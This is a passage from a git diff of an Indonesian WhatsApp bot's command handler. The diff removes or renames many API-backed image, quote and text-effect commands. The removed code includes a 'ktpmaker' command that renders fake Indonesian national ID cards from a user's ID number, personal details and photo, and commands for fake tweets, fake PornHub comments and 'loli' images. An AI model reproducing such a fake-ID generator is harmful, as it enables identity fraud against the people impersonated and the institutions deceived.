             	if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} uciha sasuke`
 		let { wallpaper } = require('./lib/scraper')
                 anu = await wallpaper(text)
@@ -2502,7 +2503,7 @@ message = await prepareWAMessageMedia({ image : { url: anu.thumbnail } }, { uplo
                 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-            case 'wikimedia': {
+            case '7wikimedia': {
                 if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} gunung lawu`
 		let { wikimedia } = require('./lib/scraper')
                 anu = await wikimedia(text)
@@ -2521,223 +2522,10 @@ message = await prepareWAMessageMedia({ image : { url: anu.thumbnail } }, { uplo
             }
             break
 //[SEARCH MENU]\\ With apikey lol human
-                    case 'konachan': case 'konachansearch': {
-                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} azur_lane`                 
-                let buttons = [
-                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: api('zenz', '/konachan', { query: text }, 'apikey') },
-                    caption: `*〔 Konachan Image Search : ${text} 〕*`,
-                    footer:  `${global.fake}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-          break
-          case 'pixiv': case 'pixivsearch': {
-                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} loli kawai`
-                let anu = await fetchJson(api('zenz', '/pixiv2', { query: text }, 'apikey'))
-                let asu = anu.result
-                let result = asu[Math.floor(Math.random() * asu.length)]
-                let buttons = [
-                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: result },
-                    caption: `*〔 Pixiv Image Search : ${text} 〕*`,
-                    footer:  `${global.fake}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-          break
-          case 'unsplash': case 'unsplashsearch': {
-                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} mountain`
-                let anu = await fetchJson(api('zenz', '/unsplash', { query: text }, 'apikey'))
-                let asu = anu.result
-                let result = asu[Math.floor(Math.random() * asu.length)]
-                let buttons = [
-                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: result },
-                    caption: `*〔 Unsplash Image Search : ${text} 〕*`,
-                    footer:  `${global.fake}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-          break
-           case 'groupwhatsapp': case 'grupwa':  case 'groupwa': case 'gcwa': {
-                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} islami`
-                let anu = await fetchJson(api('zenz', '/groupwhatsapp2', { query: text }, 'apikey'))
-                let asu = anu.result
-                let result = asu[Math.floor(Math.random() * asu.length)]
-let buttons = [
-                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1},
-                ]
-                let buttonMessage = {
-                    text: `*〔 Group WA Search 〕*
                     
-${result.title}
-${result.link}`,
-                    footer: 'Klik NEXT untuk Hasil Pencarian yang Lainnya',
-                    buttons: buttons,
-                    headerType: 2
-                }
-             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-          }
-                break
-case 'katabijak': case 'katabijaksearch': {
-                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} cinta`
-                let anu = await fetchJson(api('zenz', '/searchbijak', { query: text }, 'apikey'))
-                let asu = anu.result
-                let result = asu[Math.floor(Math.random() * asu.length)]
-let buttons = [
-                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1},
-                    {buttonId: `${prefix}copy ${result.quote}\n\n${result.author}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
-                ]
-                let buttonMessage = {
-                    text: `${result.quote}
-                    
-_~${result.author}_`,
-                    footer: 'Klik NEXT untuk Hasil Pencarian yang Lainnya',
-                    buttons: buttons,
-                    headerType: 2
-                }
-             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-          }
-                break
-//[Creator maker]\\ With apikey lol human
-              case 'gsuggest': case 'googlesuggest': {
-                if (!text) throw `*Masukan teks1+teks2+teks3*\n _Contoh:_ ${prefix + command} Fazrin+Fazrin Gamteng+Fazrin Gamteng banget`
-                replay(mess.wait)
-                siji = arg.split('+')[0]
-              loro = arg.split('+')[1]
-              telu = arg.split('+')[2]              
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/gsuggest?apikey=${global.apilol}&text1=${siji}&text2=${loro}&text3=${telu}` }, caption: `Google Suggest` }, { quoted: m })
-            }
-            break
-            case 'ytkomen': case 'ytcomment': case 'youtubecomment': {
-                if (!text) throw `*Send/Reply Image dengan Caption ${prefix + command} username+comment*\n_Contoh:_ ${prefix + command} xZrinva+Hai rakyat wibu, apa kabarnya?`
-	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command} ${text}`
-	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-	let anu = await TelegraPh(media)
-                replay(mess.wait)
-                siji = arg.split('+')[0]
-              loro = arg.split('+')[1]              
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ytcomment?apikey=${global.apilol}&username=${siji}&comment=${loro}&img=${anu}` }, caption: `YouTube Comment` }, { quoted: m })
-            }
-            break
-            case 'amongus': {
-            	if (!text) throw `*Masukan teks !*\n _Contoh:_ ${prefix + command} Hai rakyat wibu`
-            m.reply(mess.wait)
-            XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/amongus?apikey=${global.apilol}&text=${text}` }, caption: `Amongus maker` }, { quoted: m })	
-            }
-            break
-           case 'idulfitri': {
-            	if (!text) throw `*Masukan teks !*\n _Contoh:_ ${prefix + command} xZrinva`
-            m.reply(mess.wait)
-            XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/idulfitri?apikey=${global.apilol}&text=${text}` }, caption: `Idul Fitri Card Maker` }, { quoted: m })	
-            }
-            break
-            case 'ramadhan': {
-            	if (!text) throw `*Masukan teks !*\n _Contoh:_ ${prefix + command} xZrinva`
-            m.reply(mess.wait)
-            XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ramadhan?apikey=${global.apilol}&text=${text}` }, caption: `Ramadhan Card Maker` }, { quoted: m })	
-            }
-            break
-            case 'phkomen': case 'pornhubcomment': case 'phcomment': {
-                if (!text) throw `*Send/Reply Image dengan Caption ${prefix + command} username+comment*\n_Contoh:_ ${prefix + command} xZrinva+Hai rakyat wibu, apa kabarnya?`
-	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command} ${text}`
-	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-	let anu = await TelegraPh(media)
-                replay(mess.wait)
-                siji = arg.split('+')[0]
-              loro = arg.split('+')[1]              
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/phcomment?apikey=${global.apilol}&img=${anu}&text=${loro}&username=${siji}` }, caption: `PornHub Comment` }, { quoted: m })
-            }
-            break
-            case 'twtrump': case 'tweettrump': {
-            	if (!text) throw `*Masukan teks !*\n _Contoh:_ ${prefix + command} Hai rakyat Indonesia yang mayoritas wibu`
-        m.reply(mess.wait)
-    XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/tweettrump?apikey=${global.apilol}&text=${text}` }, caption: `Tweet Donald Trump` }, { quoted: m })	
-            }
-            break
-case 'ktp': case 'ktpmaker': case 'makerktp': {
-                if (!text) throw `*Send/Reply Image dengan Caption ${prefix + command} Nik+Provinsi+Kabupaten+Nama+tempat tanggal lahir+Jenis kelamin+Jalan+Rt/Rw+Desa+Kecamatan+Agama+Status kawin+Pekerjaan+Warga Negara+Berlaku hingga*\n\n_Contoh:_ \n${prefix + command} 3531130509050007+Jawa Barat+Sukabumi+xZrinva+Mars, 30-Februari-2030+Belum Diketahui+JL Jendral Fazrin +02/01+Sukonedo+Jangan Asem+Islam+Jomblo kack+Nuyul+Indonesia asli+Hari Kiamat`
-	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command} ${text}`
-	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-	let anu = await TelegraPh(media)
-                replay(mess.wait)
-              nik = arg.split('+')[0]
-              prov = arg.split('+')[1]  
-              kabu = arg.split('+')[2]  
-              name = arg.split('+')[3] 
-              ttl = arg.split('+')[4]  
-              jk = arg.split('+')[5]  
-              jl = arg.split('+')[6] 
-              rtrw = arg.split('+')[7]  
-              lurah = arg.split('+')[8]
-              camat = arg.split('+')[9] 
-              agama = arg.split('+')[10]
-              nikah = arg.split('+')[11]
-              kerja = arg.split('+')[12] 
-              warga = arg.split('+')[13]      
-              berlaku = arg.split('+')[14]      
-   
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ktpmaker?apikey=${global.apilol}&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${berlaku}&img=${anu}` }, caption: `KTP Maker` }, { quoted: m })
-            }
-            break
-case 'yugioh': case 'ygo': case 'yougioh': {
-                if (!text) throw `*Send/Reply Image dengan Caption ${prefix + command} Title+Deskripsi+atk+def*\n\n_Contoh:_\n${prefix + command} xZrinva+Owner Paling Gans, Makasih+999+1955`
-	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command} ${text}`
-	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-	let anu = await TelegraPh(media)
-                replay(mess.wait)
-                title1 = arg.split('+')[0]
-              desc1 = arg.split('+')[1]              
-              atk = arg.split('+')[2]
-              def = arg.split('+')[3]        
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/yugioh?apikey=${global.apilol}&img=${anu}&title=${title1}&desc=${desc1}&atk=${atk}&def=${def}` }, caption: `PornHub Comment` }, { quoted: m })
-            }
-            break
-//[quotes MAKER MENU]\\ With apikey lol human
-           case 'quotesmaker': case 'qmaker': {
-            	if (!text) throw `*Masukan teks/quotes!*\n\n  _Contoh:_\n${prefix + command} Sukses bukanlah kunci kebahagiaan. Kebahagiaan adalah kunci kesuksesan. Jika Anda mencintai pekerjaan Anda, Anda akan menjadi orang yang sukses`
-            m.reply(mess.wait)
-            XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/quotemaker?apikey=${global.apilol}&text=${text}` }, caption: `Quotes Maker` }, { quoted: m })	
-            }
-            break
-            case 'quotesmaker2': case 'qmaker2': {
-            	if (!text) throw `*Masukan author+quotes!*\n\n  _Contoh:_\n${prefix + command} Fazrin Mauza+Sukses bukanlah kunci kebahagiaan. Kebahagiaan adalah kunci kesuksesan. Jika Anda mencintai pekerjaan Anda, Anda akan menjadi orang yang sukses`
-            m.reply(mess.wait)
-      author1 = arg.split('+')[0]
-              quotesnya = arg.split('+')[1]              
-      XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/quotemaker2?apikey=${global.apilol}&text=${quotesnya}&author=${author1}` }, caption: `Quotes Maker2` }, { quoted: m })	
-            }
-            break
-case 'qmaker3': case 'quotesmaker2': case 'quotemakr3': {
-                if (!text) throw `*Send/Reply Image dengan Caption ${prefix + command} teks/quotes*\n\n_Contoh:_\n${prefix + command} Sukses bukanlah kunci kebahagiaan. Kebahagiaan adalah kunci kesuksesan. Jika Anda mencintai pekerjaan Anda, Anda akan menjadi orang yang sukses`
-	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command} ${text}`
-	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-	let anu = await TelegraPh(media)
-                replay(mess.wait)
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/quotemaker3?apikey=${global.apilol}&text=${text}.&img=${anu}` }, caption: `Quotes Maker 3` }, { quoted: m })
-            }
-            break
 
 //[Game id check  game id cek MENU]\\ With apikey lol human
-            case 'cekff': case 'ffcek': {
+            case '7cekff': case '7ffcek': {
             	if (!text) throw `*Masukan PlayerID Free Fire !*\n _Contoh:_ ${prefix + command} 570098876`
            m.reply(mess.wait)
  let anu = await fetchJson(`https://api.lolhuman.xyz/api/freefire/${text}?apikey=${global.apilol}`)
@@ -2747,7 +2535,7 @@ replay(`*〔 Free Fire Checker 〕*
 *⭔ Username :* ${anu.result}`)
 }
 break
-case 'cekmlbb': case 'mlbbcek': {
+case '7cekmlbb': case '7mlbbcek': {
             	if (!text) throw `*Masukan PlayerID server Mobile Legend !*\n _Contoh:_ \n${prefix + command} 84830127 2169`
             idplayer = args[0]
                 serverid = args[1]
@@ -2760,7 +2548,7 @@ replay(`*〔 Mobile Legend Checker 〕*
 *⭔ Username :* ${anu.result}`)
 }
 break
-case 'cekpubg': case 'pubgcek': {
+case '7cekpubg': case '7pubgcek': {
             	if (!text) throw `*Masukan PlayerID PUBG !*\n _Contoh:_\n${prefix + command} 5119961143`
            m.reply(mess.wait)
  let anu = await fetchJson(`https://api.lolhuman.xyz/api/pubg/${text}?apikey=${global.apilol}`)
@@ -2770,7 +2558,7 @@ replay(`*〔 PUBG Checker 〕*
 *⭔ Username :* ${anu.result}`)
 }
 break
-case 'cekdomino': case 'dominocek': {
+case '7cekdomino': case '7dominocek': {
             	if (!text) throw `*Masukan UserID Highh Domino !*\n _Contoh:_\n${prefix + command} 291756557`
            m.reply(mess.wait)
  let anu = await fetchJson(`https://api.lolhuman.xyz/api/higghdomino/${text}?apikey=${global.apilol}`)
@@ -2783,817 +2571,9 @@ break
 
 //[Teks MAKER MENU]\\ With apikey lol human
 //nulis
-case 'nulis': {
-                if (!text) throw `*Masukan Teks !*\n _Contoh:_ \n${prefix + command} Nama : Fazrin Mauza 
-Nomor absen : 11
-Kelas : X IPA 5
-Mapel : Biologi
 
- alat reproduksi manusia ada dua jenis yaitu laki-laki dan perempuan,keduanya memiliki ciri fisik dan fungsi yang berbeda
- Sistem reproduksi pada manusia termasuk ke dalam kategori reproduksi seksual. Artinya, reproduksi terjadi melalui proses bertemunya gamet jantan (sperma) dengan gamet betina (ovum) membentuk individu baru yang disebut dengan fertilisasi
- Hasil dari fertilisasi atau pembuahan adalah terbentuknya zigot. Zigot kemudian mengalami perkembangan embrio hingga dilahirkan menjadi anak. Sebagian mamalia, termasuk manusia, bereproduksi secara seksual. Laki-laki akan menghasilkan sperma, sementara perempuan akan menghasilkan ovum.`
-                replay(mess.wait)
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/nulis?apikey=${global.apilol}&text=${text}` }, caption: `mager nulis ya` }, { quoted: m })
-            }
-            break
-
-//1 TEXT PRO ME
-       case 'blackpink': case 'neon': case 'greenneon': case 'futureneon': case 'sandwriting': case 'sandsummer': case 'sandengraved': case 'text1917': case 'holographic': case 'neonlight': case 'metaldark': case 'halloween': case 'bloodfrosted': case 'newyearcard': case 'deluxesilver': case 'minion': case 'toxic': case 'bokeh': case 'natureleaves': case 'fireworksparkle': case 'jokerlogo': case 'icecold': case 'breakwall': case 'roadwarning':  case 'box3d': case 'strawberry': case 'thunder': case 'horrorblood': case 'summersand': case 'cloud': case 'luxury': case 'watercolor': case 'foggywindow': case 'harrypotter': case 'impressiveglitch': case 'magma': case 'wonderfulgraffiti': {
-                if (!text) throw `*Masukan teks!*\n _Contoh:_ ${prefix + command} Fazrin Gamteng`
-                replay(mess.wait)
-                XeonBotInc.sendMessage(m.chat, { image: { url: api('zenz', '/textprome/' + command, { text: text }, 'apikey') }, caption: `Text pro ${command}` }, { quoted: m })
-            }
-          break
-//2 TEXT PRO ME
-case 'pornhub': case 'marvelstudio': case 'ninjalogo': case 'space': case 'avenger': case 'glitch': case 'coolgravity': case 'wallgravity': case 'wolflogo': case 'lionlogo': case 'marvelstudio': {
-                if (!text) throw `*Masukan teks1 teks2*\n _Contoh:_ ${prefix + command} Fazrin Gamteng`
-                replay(mess.wait)
-                siji = args[0]
-                loro = args[1]
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${global.apilol}&text1=${siji}&text2=${loro}` }, caption: `Text pro ${command}` }, { quoted: m })
-            }
-            break
-//1 PHOTO OXY
-          case 'smoke': case 'romance': case 'cup2': case 'shadow': case 'sandwriting': case 'coffe': case 'love': case 'undergrass': case 'lovemessage': case 'burnpaper': case 'nature3d': case 'wolfmetal': case 'summer3d': case 'woodenboard': case 'woodheart': case 'flamming': case 'fallleaves': case 'summernature': case 'goldenrose': case 'underwater': case 'carvedwood': case 'harrypotter': {
-                if (!text) throw `*Masukan teks!*\n _Contoh:_ ${prefix + command} Fazrin Gamteng`
-                replay(mess.wait)
-                XeonBotInc.sendMessage(m.chat, { image: { url: api('zenz', '/photooxy1/' + command, { text: text }, 'apikey') }, caption: `Photo oxy  ${command}` }, { quoted: m })
-            }
-          break
-//2 PHOTO OXY
-case 'pubg': case 'battlefield4': case 'arcade8bit': {
-                if (!text) throw `*Masukan teks1 teks2*\n _Contoh:_ ${prefix + command} Fazrin Gamteng`
-                replay(mess.wait)
-                siji = args[0]
-                loro = args[1]
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${global.apilol}&text1=${siji}&text2=${loro}` }, caption: `Photo oxy ${command}` }, { quoted: m })
-            }
-            break
-case 'tiktokmaker': {
-                if (!text) throw `*Masukan teks1 teks2*\n _Contoh:_ ${prefix + command} Fazrin Gamteng`
-                replay(mess.wait)
-                siji = args[0]
-                loro = args[1]
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy2/tiktok?apikey=${global.apilol}&text1=${siji}&text2=${loro}` }, caption: `Photo oxy ${command}` }, { quoted: m })
-            }
-            break
-// EPHOTO 360
-case 'hologram3d': case 'birthdaycake': case 'lighttext': case 'galaxywallpaper': case 'luxurygold': case 'activegalaxybat': case 'textbyname': case 'starsnight': case 'aovwallpaper': case 'pubgmaskot': case 'mlwallpaper': case 'anonymhacker': case 'freefire': case 'avatardota': case 'avatarlolnew': case 'logogaming': {
-                if (!text) throw `*Masukan teks!*\n _Contoh:_ ${prefix + command} Fazrin Gamteng`
-                replay(mess.wait)
-                XeonBotInc.sendMessage(m.chat, { image: { url: api('zenz', '/ephoto1/' + command, { text: text }, 'apikey') }, caption: `Ephoto 360  ${command}` }, { quoted: m })
-            }
-          break
-//[SERTIFIKAT MENU]\\ With apikey lol human
-case 'ytsilver': {
-                if (!text) throw `*Masukan Teks*\n _Contoh:_ ${prefix + command} xZrinva`
-                replay(mess.wait)
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/silverplaybutton?apikey=${global.apilol}&text=${text}` }, caption: `Sertifikat YouTube Silver` }, { quoted: m })
-            }
-            break
-case 'ytgold': {
-                if (!text) throw `*Masukan Teks*\n _Contoh:_ ${prefix + command} xZrinva`
-                replay(mess.wait)
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/goldplaybutton?apikey=${global.apilol}&text=${text}` }, caption: `Sertifikat YouTube Gold` }, { quoted: m })
-            }
-            break
-case 'tolol': {
-                if (!text) throw `*Masukan Nama*\n _Contoh:_ ${prefix + command} Fazrin Mauza`
-                replay(mess.wait)
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/toloserti?apikey=${global.apilol}&name=${text}` }, caption: `Sertifikat Tolol` }, { quoted: m })
-            }
-            break
-case 'fuckboy': case 'fuckgirl': {
-                if (!text) throw `*Masukan Nama*\n _Contoh:_ ${prefix + command} Fazrin Mauza`
-                replay(mess.wait)
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}&name=${text}` }, caption: `Sertifikat ${command}` }, { quoted: m })
-            }
-            break
-case 'bucin': {
-                if (!text) throw `*Masukan Nama*\n _Contoh:_ ${prefix + command} Fazrin Mauza`
-                replay(mess.wait)
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/bucinserti?apikey=${global.apilol}&name=${text}` }, caption: `Sertifikat Bucin` }, { quoted: m })
-            }
-            break
-case 'pacar': {
-                if (!text) throw `*Masukan nama1 nama2*\n _Contoh:_ ${prefix + command} Fazrin Afita`
-                replay(mess.wait)
-                nama1 = args[0] 
-                nama2 = args[1] 
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/pacarserti?apikey=${global.apilol}&name1=${nama1}&name2=${nama2}` }, caption: `Sertifikat Pacar` }, { quoted: m })
-            }
-            break
-case 'goodboy': case 'goodgirl': case 'badboy': case 'badgirl': {
-                if (!text) throw `*Masukan Nama*\n _Contoh:_ ${prefix + command} Fazrin Mauza`
-                replay(mess.wait)
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}&name=${text}` }, caption: `Sertifikat ${command}` }, { quoted: m })
-            }
-            break
-
-//[Random image MENU]\\ With apikey lol human
-case 'rblackpink': {
-let buttons = [
-                    {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: `https://api.lolhuman.xyz/api/random/blackpink?apikey=${global.apilol}` },
-                    caption: `*〔 Random Image Blackpink〕*`,
-                    footer:  `${global.fake}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-          break
-case 'bts': case 'exo': case 'cecan': case 'cogan': case 'estetic': case 'elf': case 'loli': case 'neko': case 'waifu': case 'shota': case 'husbu': case 'sagiri': case 'elaina': case 'shinobu': case 'kanna': case 'megumin': case 'art': case 'wallnime': {
-                let buttons = [
-                    {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=${global.apilol}` },
-                    caption: `*〔 Random Image ${command} 〕*`,
-                    footer:  `${global.fake}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-           //     let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })               
-                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-          break
-case 'neko2': {
-let buttons = [
-                    {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: `https://api.lolhuman.xyz/api/random2/neko?apikey=${global.apilol}` },
-                    caption: `*〔 Random Image Neko 2 〕*`,
-                    footer:  `${global.fake}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-       }
-          break
-
-          case 'ngif': case 'feed': case 'kiss': case 'smug': case 'tickle': case 'cuddle': case 'fox_girl': {
-	m.reply(mess.wait)
-	let media = `https://api.lolhuman.xyz/api/random2/${command}?apikey=${global.apilol}`
-	let buttons = [
-                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    text: `*Reply Sticker dengan caption* ${prefix}togif \n*Untuk mengubah Sticker menjadi GIF*\n\n*Reply Sticker dengan caption* ${prefix}toimg \n*Untuk mengubah Sticker menjadi FOTO*`,
-                    footer: `Random ${command}`,
-                    buttons: buttons,
-                    headerType: 2
-                }
-                let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })               
-                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-         await fs.unlinkSync(encmedia)
-   }
-            break
-case 'bully': case 'cry': case 'hug': case 'awoo': case 'lick': case 'pat': case 'bonk': case 'yeet': case 'blush': case 'smile': case 'wave': case 'highfive': case 'handhold': case 'nom': case 'bite': case 'glomp': case 'kill': case 'slap': case 'happy': case 'wink': case 'dance': case 'cringe': {
-	m.reply(mess.wait)
-	let media = `https://api.lolhuman.xyz/api/random/${command}?apikey=${global.apilol}`
-	let buttons = [
-                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    text: `*Reply Sticker dengan caption* ${prefix}togif \n*Untuk mengubah Sticker menjadi GIF*\n\n*Reply Sticker dengan caption* ${prefix}toimg \n*Untuk mengubah Sticker menjadi FOTO*`,
-                    footer: `Random ${command}`,
-                    buttons: buttons,
-                    headerType: 2
-                }
-                let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })               
-                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-         await fs.unlinkSync(encmedia)
-   }
-            break
-            case 'gasm': {
-	m.reply(mess.wait)
-	let media = `https://api.lolhuman.xyz/api/random2/${command}?apikey=${global.apilol}`
-	let buttons = [
-                    {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: media },
-                    caption: `*〔 Random Image ${command} 〕*`,
-                    footer:  `${global.fake}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })               
-                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-         await fs.unlinkSync(encmedia)
-   }
-            break
-
-
-//[Random text MENU]\\ With apikey lol human
-case 'copy':{
-	m.reply(`${text}`)
-	}
-	break
-case 'quotes': {
-                let anu = await fetchJson(api('zenz', '/random/quotes', {}, 'apikey'))
-                quotesnya = anu.result.quote
-                quotesby = anu.result.by
-                hihi = quotesby
-                haha = quotesnya
-                    if (args[0] === 'teks') {
-						reply(`${haha}`)
-              } else {  
-                   let buttons = [
-                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
-                     {buttonId: `${prefix}copy ${haha}\n\nBy ${hihi}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
-                ]
-                let buttonMessage = {
-                    text: `${haha}`,
-                    footer: `By ${quotesby}`,
-                    buttons: buttons,
-                    headerType: 2
-                }
-            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-                }
-            }
-            break
- case 'quotesislami': {
- 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/quotes/islami?apikey=${global.apilol}`)
-     let buttons = [
-                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
-                     {buttonId: `${prefix}copy ${anu.result}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
-                ]
-                let buttonMessage = {
-                    text: anu.result,
-                    footer: `© ${global.botnma} by ${global.ownernma}`,
-                    buttons: buttons,
-                    headerType: 2
-                }
-            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-            break
-case 'quotesdilan': {
- 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${global.apilol}`)
-     let buttons = [
-                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
-                     {buttonId: `${prefix}copy ${anu.result}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
-                ]
-                let buttonMessage = {
-                    text: anu.result,
-                    footer: `By ${global.fake}`,
-                    buttons: buttons,
-                    headerType: 2
-                }
-            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-            break
-case 'quotesanime': {
- 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${global.apilol}`)
-     let buttons = [
-                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
-                     {buttonId: `${prefix}copy ${anu.result.quote}\n\nCharacter: ${anu.result.character}\nAnime: ${anu.result.anime}\nEpisode: ${anu.result.episode}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
-                ]
-                let buttonMessage = {
-                    text: anu.result.quote,
-                    footer: `Character: ${anu.result.character}
-Anime: ${anu.result.anime}
-Episode: ${anu.result.episode}`,
-                    buttons: buttons,
-                    headerType: 2
-                }
-            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-            break
-case 'faktaunik': case 'pantun': case 'puisi': case 'katabucin': {
- 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${global.apilol}`)
-     let buttons = [
-                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
-{buttonId: `${prefix}copy ${anu.result}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}                    
-                ]
-                let buttonMessage = {
